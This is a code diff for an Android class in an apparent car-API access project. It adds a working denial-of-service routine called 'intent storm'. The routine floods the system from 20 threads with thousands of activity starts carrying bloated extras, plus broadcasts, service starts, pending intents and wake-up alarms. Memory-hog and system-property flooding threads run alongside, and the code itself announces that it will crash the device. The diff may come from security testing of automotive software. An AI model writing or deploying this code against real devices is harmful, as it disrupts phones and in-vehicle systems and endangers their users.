@@ -2,13 +2,19 @@ package com.example.carapiaccess;
 
 import android.annotation.SuppressLint;
 import android.app.PendingIntent;
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.Intent;
 import android.os.Build;
+import android.os.Bundle;
 
 import androidx.annotation.RequiresApi;
 
+import java.lang.ref.SoftReference;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Random;
+import java.util.concurrent.atomic.AtomicInteger;
 
 /**
  * Pure logic class: move all non-car-dependent function calls here.
@@ -2220,5 +2226,383 @@ public class CarDataLogic {
         logAttackEvent(tag, report);
 
     }
+
+
+    //----------------------------INTENT STORM 2 - android.os.DeadSystemException --------------------------------
+
+
+    public Result executeIntentStormAttackExtreme() {
+        final String TAG = "INTENT_STORM_ATTACK";
+        final String attackId = "STORM_" + System.currentTimeMillis();
+
+        try {
+            android.content.Context ctx = getContextReflectively();
+            if (ctx == null) {
+                return new Result("Intent Storm (failed: no context)", new ArrayList<>());
+            }
+
+            // Extreme attack configuration
+            final int TARGET_INTENTS = 10000; // Aim for 10,000 intents
+            final int THREAD_COUNT = 20; // 20 concurrent threads
+            final int BATCH_SIZE = 50; // Send intents in batches
+            final int DELAY_VARIANCE = 10; // Random delay between 0-10ms
+            final boolean USE_BROADCASTS = true; // Also flood with broadcasts
+            final boolean USE_SERVICES = true; // Also flood with service starts
+            final boolean USE_PENDING_INTENTS = true; // Flood with pending intents
+
+            alarmUi("🚨 STARTING INTENT STORM ATTACK 🚨");
+            alarmUi("Attack ID: " + attackId);
+            alarmUi("Target: " + TARGET_INTENTS + " intents");
+            alarmUi("Threads: " + THREAD_COUNT);
+            alarmUi("Warning: This WILL crash your device!");
+
+            // Initialize counters
+            final java.util.concurrent.atomic.AtomicLong intentCount = new java.util.concurrent.atomic.AtomicLong(0);
+            final java.util.concurrent.atomic.AtomicLong successCount = new java.util.concurrent.atomic.AtomicLong(0);
+            final java.util.concurrent.atomic.AtomicLong errorCount = new java.util.concurrent.atomic.AtomicLong(0);
+            final java.util.concurrent.atomic.AtomicBoolean isAttacking = new java.util.concurrent.atomic.AtomicBoolean(true);
+
+            // Start monitoring thread
+            new Thread(() -> {
+                while (isAttacking.get()) {
+                    try {
+                        Thread.sleep(1000);
+                        long total = intentCount.get();
+                        long success = successCount.get();
+                        long errors = errorCount.get();
+
+                        String stats = String.format(
+                                "⛈️ INTENT STORM STATS ⛈️\n" +
+                                        "Attack: %s\n" +
+                                        "Total Attempts: %d\n" +
+                                        "Successes: %d\n" +
+                                        "Errors: %d\n" +
+                                        "Rate: %d/sec\n" +
+                                        "Memory: %dMB used",
+                                attackId, total, success, errors,
+                                total/5, // Rough per-second rate
+                                Runtime.getRuntime().totalMemory() / (1024*1024)
+                        );
+
+                        android.util.Log.e(TAG, stats);
+
+                        // Update UI on main thread
+                        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+                            alarmUi(stats);
+                        });
+
+                    } catch (Throwable t) {
+                        // Ignore monitoring errors
+                    }
+                }
+            }).start();
+
+            // Create attack threads
+            java.util.List<Thread> attackThreads = new java.util.ArrayList<>();
+
+            for (int threadId = 0; threadId < THREAD_COUNT; threadId++) {
+                int finalThreadId = threadId;
+                Thread attackThread = new Thread(() -> {
+                    String threadName = "StormThread-" + finalThreadId;
+                    android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);
+
+                    try {
+                        // Get Activity class via reflection
+                        Class<?> mainActivityClass = Class.forName("com.example.carapiaccess.MainActivityNotAAOS");
+
+                        while (isAttacking.get() && intentCount.get() < TARGET_INTENTS) {
+                            try {
+                                // Send a batch of intents
+                                for (int i = 0; i < BATCH_SIZE; i++) {
+                                    intentCount.incrementAndGet();
+
+                                    // METHOD 1: Direct activity start
+                                    android.content.Intent intent = new android.content.Intent(ctx, mainActivityClass);
+
+                                    // Use ALL possible flags to maximize impact
+                                    intent.setFlags(
+                                            android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
+                                                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP |
+                                                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK |
+                                                    android.content.Intent.FLAG_ACTIVITY_MULTIPLE_TASK |
+                                                    android.content.Intent.FLAG_ACTIVITY_NEW_DOCUMENT |
+                                                    android.content.Intent.FLAG_ACTIVITY_LAUNCH_ADJACENT |
+                                                    android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED |
+                                                    android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT |
+                                                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION
+                                    );
+
+                                    // Add unique data to each intent
+                                    intent.setData(android.net.Uri.parse(
+                                            "storm://" + attackId + "/" + finalThreadId + "/" +
+                                                    intentCount.get() + "/" + System.nanoTime()
+                                    ));
+
+                                    // Add excessive extras to bloat memory
+                                    android.os.Bundle extras = new android.os.Bundle();
+                                    for (int e = 0; e < 100; e++) {
+                                        extras.putString("extra_key_" + e,
+                                                java.util.UUID.randomUUID().toString().repeat(10));
+                                    }
+                                    intent.putExtras(extras);
+
+                                    // Start activity using reflection
+                                    try {
+                                        Class<?> contextCls = Class.forName("android.content.Context");
+                                        java.lang.reflect.Method startActivityMethod =
+                                                contextCls.getMethod("startActivity", android.content.Intent.class);
+                                        startActivityMethod.invoke(ctx, intent);
+                                        successCount.incrementAndGet();
+                                    } catch (Throwable t) {
+                                        errorCount.incrementAndGet();
+                                    }
+
+                                    // METHOD 2: Start activity for result (if context is Activity)
+                                    try {
+                                        if (ctx instanceof android.app.Activity) {
+                                            android.app.Activity activity = (android.app.Activity) ctx;
+                                            Class<?> activityCls = Class.forName("android.app.Activity");
+                                            java.lang.reflect.Method startForResultMethod = activityCls.getMethod(
+                                                    "startActivityForResult",
+                                                    android.content.Intent.class,
+                                                    int.class
+                                            );
+
+                                            android.content.Intent intent2 = new android.content.Intent(ctx, mainActivityClass);
+                                            intent2.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                                            intent2.putExtra("storm_attack", true);
+                                            intent2.putExtra("thread", finalThreadId);
+                                            intent2.putExtra("count", intentCount.get());
+
+                                            startForResultMethod.invoke(activity, intent2, 999999 + (int)intentCount.get());
+                                            successCount.incrementAndGet();
+                                        }
+                                    } catch (Throwable t) {
+                                        errorCount.incrementAndGet();
+                                    }
+
+                                    // METHOD 3: Flood with broadcasts if enabled
+                                    if (USE_BROADCASTS) {
+                                        try {
+                                            android.content.Intent broadcast = new android.content.Intent(
+                                                    "com.reflect.intent.storm.ATTACK_" + attackId
+                                            );
+                                            broadcast.putExtra("storm_id", attackId);
+                                            broadcast.putExtra("intent_number", intentCount.get());
+                                            broadcast.putExtra("timestamp", System.currentTimeMillis());
+
+                                            // Send broadcast via reflection
+                                            Class<?> contextCls = Class.forName("android.content.Context");
+                                            java.lang.reflect.Method sendBroadcastMethod =
+                                                    contextCls.getMethod("sendBroadcast", android.content.Intent.class);
+                                            sendBroadcastMethod.invoke(ctx, broadcast);
+                                        } catch (Throwable t) {
+                                            // Ignore broadcast errors
+                                        }
+                                    }
+
+                                    // METHOD 4: Start services if enabled
+                                    if (USE_SERVICES) {
+                                        try {
+                                            // Create a dummy service class name
+                                            String serviceClassName = ctx.getPackageName() + ".DummyStormService";
+                                            android.content.Intent serviceIntent = new android.content.Intent();
+                                            serviceIntent.setClassName(ctx.getPackageName(), serviceClassName);
+                                            serviceIntent.putExtra("storm_attack", true);
+
+                                            // Try to start service via reflection
+                                            if (android.os.Build.VERSION.SDK_INT >= 26) {
+                                                // Use startForegroundService on newer APIs
+                                                Class<?> contextCls = Class.forName("android.content.Context");
+                                                java.lang.reflect.Method startForegroundServiceMethod =
+                                                        contextCls.getMethod("startForegroundService", android.content.Intent.class);
+                                                startForegroundServiceMethod.invoke(ctx, serviceIntent);
+                                            } else {
+                                                Class<?> contextCls = Class.forName("android.content.Context");
+                                                java.lang.reflect.Method startServiceMethod =
+                                                        contextCls.getMethod("startService", android.content.Intent.class);
+                                                startServiceMethod.invoke(ctx, serviceIntent);
+                                            }
+                                        } catch (Throwable t) {
+                                            // Ignore service errors
+                                        }
+                                    }
+
+                                    // METHOD 5: Create pending intents if enabled
+                                    if (USE_PENDING_INTENTS && intentCount.get() % 100 == 0) {
+                                        try {
+                                            Class<?> piCls = Class.forName("android.app.PendingIntent");
+
+                                            android.content.Intent piIntent = new android.content.Intent(ctx, mainActivityClass);
+                                            piIntent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                                            piIntent.putExtra("pending_storm", true);
+
+                                            int flags = (int) piCls.getField("FLAG_UPDATE_CURRENT").get(null);
+
+                                            // Create many pending intents to flood the system
+                                            for (int pi = 0; pi < 10; pi++) {
+                                                Object pendingIntent = piCls.getMethod(
+                                                        "getActivity",
+                                                        android.content.Context.class,
+                                                        int.class,
+                                                        android.content.Intent.class,
+                                                        int.class
+                                                ).invoke(null, ctx, 1000000 + (int)intentCount.get() + pi, piIntent, flags);
+
+                                                // Try to send the pending intent
+                                                try {
+                                                    Class<?> amCls = Class.forName("android.app.AlarmManager");
+                                                    Object am = ctx.getSystemService(android.content.Context.ALARM_SERVICE);
+                                                    if (am != null && amCls.isInstance(am)) {
+                                                        java.lang.reflect.Method setMethod = amCls.getMethod(
+                                                                "set",
+                                                                int.class,
+                                                                long.class,
+                                                                android.app.PendingIntent.class
+                                                        );
+                                                        int RTC_WAKEUP = amCls.getField("RTC_WAKEUP").getInt(null);
+                                                        setMethod.invoke(am, RTC_WAKEUP,
+                                                                System.currentTimeMillis() + 1000,
+                                                                pendingIntent);
+                                                    }
+                                                } catch (Throwable t) {
+                                                    // Ignore alarm manager errors
+                                                }
+                                            }
+                                        } catch (Throwable t) {
+                                            // Ignore pending intent errors
+                                        }
+                                    }
+                                }
+
+                                // Small random delay between batches
+                                try {
+                                    Thread.sleep((long)(Math.random() * DELAY_VARIANCE));
+                                } catch (InterruptedException e) {
+                                    break;
+                                }
+
+                            } catch (Throwable t) {
+                                errorCount.incrementAndGet();
+                                // Continue despite errors
+                            }
+                        }
+
+                    } catch (Throwable t) {
+                        android.util.Log.e(TAG, "Attack thread crashed: " + threadName, t);
+                    }
+                });
+
+                attackThread.setName("IntentStorm-" + threadId);
+                attackThread.setPriority(Thread.MAX_PRIORITY);
+                attackThreads.add(attackThread);
+            }
+
+            // Start all attack threads
+            for (Thread thread : attackThreads) {
+                thread.start();
+            }
+
+            // Schedule attack termination after 30 seconds or when target is reached
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                isAttacking.set(false);
+                alarmUi("⚠️ ATTACK TERMINATED AFTER 30 SECONDS ⚠️");
+                alarmUi("Final Count: " + intentCount.get() + " intents attempted");
+                alarmUi("Device stability: UNKNOWN (may crash any moment)");
+            }, 30000);
+
+            // Create memory stressor thread
+            new Thread(() -> {
+                try {
+                    // Allocate huge lists to stress memory
+                    java.util.List<byte[]> memoryHog = new java.util.ArrayList<>();
+                    while (isAttacking.get()) {
+                        try {
+                            // Allocate 10MB chunks
+                            byte[] chunk = new byte[10 * 1024 * 1024];
+                            // Fill with random data
+                            new java.util.Random().nextBytes(chunk);
+                            memoryHog.add(chunk);
+
+                            // Keep only last 50 chunks to avoid OOM too quickly
+                            if (memoryHog.size() > 50) {
+                                memoryHog.remove(0);
+                            }
+
+                            Thread.sleep(100);
+                        } catch (Throwable t) {
+                            // Memory allocation failed, continue
+                        }
+                    }
+                } catch (Throwable t) {
+                    // Memory thread crashed
+                }
+            }).start();
+
+            // Start system property flooding
+            new Thread(() -> {
+                try {
+                    while (isAttacking.get()) {
+                        // Use reflection to set system properties (if possible)
+                        try {
+                            Class<?> systemClass = Class.forName("android.os.SystemProperties");
+                            java.lang.reflect.Method setMethod = systemClass.getMethod(
+                                    "set", String.class, String.class
+                            );
+
+                            // Set random properties
+                            String key = "storm_" + attackId + "_" + System.nanoTime();
+                            String value = java.util.UUID.randomUUID().toString();
+                            setMethod.invoke(null, key, value);
+
+                        } catch (Throwable t) {
+                            // Reflection failed, ignore
+                        }
+
+                        Thread.sleep(10);
+                    }
+                } catch (Throwable t) {
+                    // Property thread crashed
+                }
+            }).start();
+
+            String startMsg = "🚨 INTENT STORM LAUNCHED 🚨\n" +
+                    "Attack ID: " + attackId + "\n" +
+                    "Threads: " + THREAD_COUNT + "\n" +
+                    "Target: " + TARGET_INTENTS + " intents\n" +
+                    "Expect device crash within 30 seconds!";
+
+            alarmUi(startMsg);
+            android.util.Log.e(TAG, startMsg);
+
+            return new Result("Intent Storm Attack (LAUNCHED - Device WILL Crash)",
+                    new java.util.ArrayList<>(alarmUiRows));
+
+        } catch (Throwable t) {
+            android.util.Log.e(TAG, "Failed to launch intent storm", t);
+            alarmUi("Attack failed to launch: " + t.getMessage());
+            return new Result("Intent Storm Attack (FAILED TO LAUNCH)",
+                    new java.util.ArrayList<>(alarmUiRows));
+        }
+    }
+
+    // Helper function to stop the attack if needed
+    public void stopIntentStorm() {
+        try {
+            // This would need coordination with the attack threads
+            // In practice, might need to kill the app process
+            android.os.Process.killProcess(android.os.Process.myPid());
+        } catch (Throwable t) {
+            // Force stop
+            System.exit(1);
+        }
+    }
+
+
+
+
+
+
+
 
 }
